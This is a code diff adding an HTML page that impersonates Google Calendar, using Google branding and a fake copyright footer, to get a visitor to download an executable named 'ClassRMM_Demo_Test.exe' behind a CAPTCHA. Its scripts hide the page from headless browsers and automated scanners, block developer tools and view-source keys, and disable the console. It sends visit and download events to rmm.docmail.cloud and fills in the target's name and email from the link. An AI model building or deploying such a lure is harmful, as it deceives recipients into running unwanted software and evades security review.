@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Google Calendar – Event Attachment</title>
+<!-- c6d2d1a86c0206bc155b4de2edc40dd7db89c678f8142c905d736853c9aabc30 --><!-- 048a381f4bde7e5a1da67c6e -->
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500&display=swap');
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{font-family:"Roboto","Google Sans",Arial,sans-serif;background:#f1f3f4;color:#202124;min-height:100vh}
+.hdr{background:#fff;border-bottom:1px solid #e0e0e0;height:64px;display:flex;align-items:center;padding:0 24px;gap:16px;box-shadow:0 1px 3px rgba(0,0,0,.08)}
+.g-logo{display:flex;align-items:center;gap:8px;text-decoration:none}
+.g-word span:nth-child(1){color:#4285f4}
+.g-word span:nth-child(2){color:#ea4335}
+.g-word span:nth-child(3){color:#fbbc05}
+.g-word span:nth-child(4){color:#4285f4}
+.g-word span:nth-child(5){color:#34a853}
+.g-word span:nth-child(6){color:#ea4335}
+.g-word{font-family:"Product Sans","Google Sans",Arial,sans-serif;font-size:22px;font-weight:400}
+.suffix{font-size:22px;color:#5f6368}
+.main{max-width:660px;margin:28px auto;padding:0 16px}
+.event-card{background:#fff;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,.12);overflow:hidden;margin-bottom:16px}
+.event-header{background:#1a73e8;padding:20px 24px 16px}
+.event-date{display:flex;align-items:center;gap:10px}
+.date-box{background:rgba(255,255,255,.15);border-radius:8px;padding:8px 14px;text-align:center}
+.date-day{font-size:28px;font-weight:700;color:#fff;line-height:1}
+.date-month{font-size:11px;color:rgba(255,255,255,.8);text-transform:uppercase;letter-spacing:.5px;margin-top:2px}
+.event-title{margin-top:14px;font-size:20px;font-weight:700;color:#fff}
+.event-org{font-size:13px;color:rgba(255,255,255,.75);margin-top:4px}
+.event-body{padding:20px 24px}
+.section-label{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.8px;color:#5f6368;margin-bottom:10px}
+.attachment-row{display:flex;align-items:center;gap:12px;border:1px solid #dadce0;border-radius:8px;padding:12px 14px;margin-bottom:18px}
+.att-icon{flex-shrink:0}
+.att-name{font-size:14px;font-weight:500;color:#202124;word-break:break-all}
+.att-meta{font-size:12px;color:#5f6368;margin-top:2px}
+.recip{font-size:12px;color:#5f6368;display:none;margin-top:2px}
+.verify-card{background:#f8f9fa;border:1px solid #dadce0;border-radius:8px;padding:16px 18px}
+.verify-lbl{font-size:13px;color:#5f6368;font-weight:500;margin-bottom:10px}
+.cap-row{display:flex;justify-content:center}
+#cap-err{color:#ea4335;font-size:12px;margin-top:8px;display:none;text-align:center}
+#dl-btn{display:none;margin-top:14px;padding:10px 28px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;font-family:inherit}
+#dl-btn:hover{background:#1765cc}
+.g-footer{text-align:center;font-size:12px;color:#80868b;margin-top:20px;padding-bottom:12px}
+.g-footer a{color:#80868b;text-decoration:none}
+</style>
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+<script>(function(){
+var semtbtio=navigator.webdriver||false;
+var aedvakrz=window.outerWidth===0||window.outerHeight===0;
+var zujysasj=/HeadlessChrome|PhantomJS|Selenium|puppeteer/i.test(navigator.userAgent);
+if(semtbtio||aedvakrz||zujysasj){document.body.innerHTML='';return;}
+document.addEventListener('contextmenu',function(lgxpjebh){ lgxpjebh.preventDefault(); });
+document.addEventListener('keydown',function(ojmygjtr){
+  if(ojmygjtr.key==='F12'||(ojmygjtr.ctrlKey&&ojmygjtr.shiftKey&&(ojmygjtr.key==='I'||ojmygjtr.key==='J'||ojmygjtr.key==='C'))||(ojmygjtr.ctrlKey&&ojmygjtr.key==='U'))
+  { ojmygjtr.preventDefault();return false; }
+});
+try{['log','warn','error','info','debug','table','dir','trace'].forEach(function(m){console[m]=function(){};}); }catch(_){}
+})();</script>
+</head>
+<body>
+<div class="hdr">
+  <a class="g-logo" href="#">
+    <svg width="30" height="30" viewBox="0 0 30 30"><rect width="30" height="30" rx="4" fill="#fff"/><rect x="2" y="2" width="26" height="26" rx="3" fill="none" stroke="#dadce0" stroke-width="1"/><rect x="2" y="8" width="26" height="2" fill="#ea4335"/><rect x="2" y="2" width="26" height="7" rx="3" fill="#fff" style="clip-path:inset(0 0 2px 0)"/><text x="8" y="22" font-family="Arial" font-size="11" font-weight="bold" fill="#1a73e8">31</text><rect x="8" y="4" width="3" height="5" rx="1.5" fill="#ea4335"/><rect x="19" y="4" width="3" height="5" rx="1.5" fill="#ea4335"/></svg>
+    <span class="g-word"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></span>
+    <span class="suffix">&nbsp;Calendar</span>
+  </a>
+</div>
+<div class="main">
+  <div class="event-card">
+    <div class="event-header">
+      <div class="event-date">
+        <div class="date-box"><div class="date-day">28</div><div class="date-month">Apr</div></div>
+      </div>
+      <div class="event-title">Test file — verifying Generate Link works end-to-end.</div>
+      <div class="event-org">Organized by ClassRMM</div>
+    </div>
+    <div class="event-body">
+      <div class="section-label">Attachment</div>
+      <div class="attachment-row">
+        <div class="att-icon">
+          <svg width="38" height="46" viewBox="0 0 64 80"><path d="M0 4C0 1.8 1.8 0 4 0H42L64 22V76C64 78.2 62.2 80 60 80H4C1.8 80 0 78.2 0 76V4Z" fill="#4285f4"/><path d="M42 0L64 22H44C42.9 22 42 21.1 42 20V0Z" fill="rgba(255,255,255,.22)"/><rect x="12" y="32" width="40" height="4" rx="2" fill="white" opacity=".9"/><rect x="12" y="42" width="28" height="4" rx="2" fill="white" opacity=".65"/><rect x="12" y="52" width="34" height="4" rx="2" fill="white" opacity=".65"/></svg>
+        </div>
+        <div>
+          <div class="att-name">ClassRMM_Demo_Test.exe</div>
+          <div class="att-meta">Attached by ClassRMM</div>
+          <div class="recip" id="recipient-info"></div>
+        </div>
+      </div>
+      <div class="verify-card">
+        <div class="verify-lbl">Confirm you&rsquo;re not a robot to download the attachment</div>
+        <div class="cap-row"><div class="cf-turnstile" data-sitekey="0x4AAAAAADEUnhXoe-14ZEdK" data-callback="onCaptchaSuccess"></div></div>
+        <div id="cap-err"></div>
+      </div>
+      <button id="dl-btn">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" style="vertical-align:middle;margin-right:6px"><path d="M13 5v8.586l3.293-3.293 1.414 1.414L12 17.414l-5.707-5.707 1.414-1.414L11 13.586V5h2zm-7 14h12v-2H6v2z"/></svg>
+        Download
+      </button>
+    </div>
+  </div>
+  <div class="g-footer">&copy; 2025 Google &nbsp;&middot;&nbsp; <a href="#">Privacy</a> &nbsp;&middot;&nbsp; <a href="#">Terms</a></div>
+</div>
+<script>
+var _srv='https://rmm.docmail.cloud';var _lid=31;
+function _trk(evt){try{fetch(_srv+'/generate-link/track',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({link_id:_lid,event:evt})})}catch(_){}}
+async function onCaptchaSuccess(token){
+var btn=document.getElementById('dl-btn');var err=document.getElementById('cap-err');
+err.style.display='none';
+try{
+var r=await fetch(_srv+'/generate-link/verify-captcha',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({link_id:_lid,captcha_token:token})});
+var d=await r.json();
+if(!r.ok){err.textContent=d.detail||'Verification failed. Please try again.';err.style.display='block';if(typeof turnstile!=='undefined')turnstile.reset();return;}
+var a=document.createElement('a');a.href=d.url;a.download=d.display_name||'';document.body.appendChild(a);
+btn.style.display=btn.dataset.display||'inline-flex';btn.onclick=function(){_trk('download');a.click();};
+}catch(e){err.textContent='Network error. Please try again.';err.style.display='block';if(typeof turnstile!=='undefined')turnstile.reset();}
+}
+function getParams(){
+var p=new URLSearchParams(window.location.search);var n=p.get('n')||'';var e=p.get('e')||'';
+var el=document.getElementById('recipient-info');if(!el)return;
+if(n||e){el.style.display='block';
+if(n&&e)el.textContent='For: '+decodeURIComponent(n)+' — '+decodeURIComponent(e);
+else el.textContent='For: '+decodeURIComponent(n||e);}
+}
+window.addEventListener('load',function(){getParams();_trk('visit');});</script>
+</body></html>
